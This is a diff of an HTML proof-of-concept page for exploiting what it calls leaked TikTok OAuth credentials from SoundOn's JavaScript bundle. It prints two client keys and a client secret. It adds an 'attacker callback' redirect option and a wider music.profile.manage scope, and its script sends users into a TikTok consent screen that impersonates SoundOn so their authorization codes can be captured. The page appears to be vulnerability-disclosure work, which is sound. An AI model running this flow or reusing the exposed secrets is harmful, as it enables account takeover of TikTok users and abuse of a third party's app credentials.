@@ -3,62 +3,86 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TikTok OAuth Demo — Redirecting...</title>
+<title>TikTok OAuth Client Credential Exposure — PoC</title>
 <style>
-body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 40px; max-width: 720px; margin: 0 auto; }
+body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 40px; max-width: 800px; margin: 0 auto; }
 h2 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 8px; }
 .label { color: #888; }
 .val { color: #ff0; word-break: break-all; }
 .section { background: #111; border: 1px solid #222; border-radius: 8px; padding: 20px; margin: 16px 0; }
-.btn { display: inline-block; background: #fe2c55; color: #fff; border: none; padding: 12px 32px; border-radius: 6px; font-size: 15px; cursor: pointer; text-decoration: none; }
+.btn { display: inline-block; background: #fe2c55; color: #fff; border: none; padding: 12px 32px; border-radius: 6px; font-size: 15px; cursor: pointer; text-decoration: none; margin: 4px; }
 .warn { color: #fe2c55; }
+.success { color: #0f0; }
+select, input { background: #222; color: #fff; border: 1px solid #333; padding: 8px 12px; border-radius: 4px; font-size: 14px; font-family: monospace; width: 100%; margin: 4px 0; }
 </style>
 </head>
 <body>
 <h1>TikTok OAuth Client Credential Exposure — PoC</h1>
 
 <div class="section">
-<h2>Leaked Credentials (from SoundOn adek.js)</h2>
-<div><span class="label">client_key:</span> <span class="val">awulj3e36brrh086</span></div>
-<div><span class="label">client_secret:</span> <span class="val">e63acb9afab646ee9340f16a2380b1ed</span></div>
-<div><span class="label">source:</span> <span class="val">index.24851df7.js :: module 69544</span></div>
+<h2>1. Leaked Credentials (from SoundOn index.24851df7.js module 69544)</h2>
+<div><span class="label">server-side client_key:</span> <span class="val">awulj3e36brrh086</span> <span class="warn">(for token exchange)</span></div>
+<div><span class="label">browser-side client_key:</span> <span class="val">awcdygtcjh22v33k</span> <span class="success">(for authorize URL — from kak.js)</span></div>
+<div><span class="label">client_secret:</span> <span class="val">e63acb9afab646ee9340f16a2380b1ed</span> <span class="warn">(for token exchange)</span></div>
 </div>
 
 <div class="section">
-<h2>OAuth Authorization URL</h2>
+<h2>2. Select Redirect URI Bypass Strategy</h2>
+<select id="strategy" onchange="updateCallback()">
+<option value="direct">1. Direct to attacker callback (test redirect_uri validation)</option>
+<option value="soundon-callback">2. Use SoundOn's registered callback (safe, no redirect_uri bypass)</option>
+</select>
+</div>
+
+<div class="section">
+<h2>3. OAuth Authorization URL</h2>
 <div><span class="label">endpoint:</span> <span class="val">https://www.tiktok.com/v2/auth/authorize/</span></div>
-<div><span class="label">client_key:</span> <span class="val">awulj3e36brrh086</span></div>
-<div><span class="label">scope:</span> <span class="val">user.info.basic,user.info.username</span></div>
+<div><span class="label">client_key:</span> <span class="val">awcdygtcjh22v33k</span></div>
+<div><span class="label">scope:</span> <span class="val">user.info.basic,user.info.username,music.profile.manage</span></div>
 <div><span class="label">response_type:</span> <span class="val">code</span></div>
 <div><span class="label">redirect_uri:</span> <span class="val" id="cbDisplay">...</span></div>
 <div><span class="label">state:</span> <span class="val" id="stateDisplay">...</span></div>
 </div>
 
 <div class="section">
-<p>Clicking the button below initiates the TikTok OAuth authorization flow using
-the <span class="warn">leaked client_key</span>. After authorization, TikTok will redirect
-to this server with the authorization code.</p>
+<p>Click the button to initiate TikTok OAuth. TikTok will show:</p>
+<p style="color:#fff">"<strong>SoundOn</strong> would like to access your TikTok account"</p>
 <br>
-<a class="btn" id="goBtn" href="#" onclick="go(); return false;">▶ Initiate TikTok OAuth Authorization</a>
+<a class="btn" href="#" onclick="go(); return false;">▶ Initiate TikTok OAuth (Strategy 1: Direct Callback)</a>
 </div>
 
 <script>
-const CLIENT_KEY = "awulj3e36brrh086";
-const SCOPE = "user.info.basic,user.info.username";
-const CALLBACK = window.location.origin + window.location.pathname.replace("index.html","") + "callback.html";
-const STATE = "poc_" + Date.now();
+const BROWSER_KEY = "awcdygtcjh22v33k";
+const SCOPE = "user.info.basic,user.info.username,music.profile.manage";
 
-document.getElementById("cbDisplay").textContent = CALLBACK;
+const attackerCallback = window.location.origin + window.location.pathname.replace("index.html","") + "callback.html";
+const soundonCallback = "https://www.soundon.global/login/oauth/middle";
+let currentCb = attackerCallback;
+
+function updateCallback() {
+  const strat = document.getElementById("strategy").value;
+  if (strat === "direct") {
+    currentCb = attackerCallback;
+  } else {
+    currentCb = soundonCallback;
+  }
+  document.getElementById("cbDisplay").textContent = currentCb;
+}
+updateCallback();
+
+const STATE = "poc_" + Date.now();
 document.getElementById("stateDisplay").textContent = STATE;
 
 function go() {
   const url =
     "https://www.tiktok.com/v2/auth/authorize/?" +
-    "client_key=" + CLIENT_KEY +
+    "client_key=" + BROWSER_KEY +
     "&scope=" + SCOPE +
     "&response_type=code" +
-    "&redirect_uri=" + encodeURIComponent(CALLBACK) +
-    "&state=" + STATE;
+    "&lang=en" +
+    "&redirect_uri=" + encodeURIComponent(currentCb) +
+    "&state=" + STATE +
+    "&prompts=consent";
   window.location.href = url;
 }
 </script>
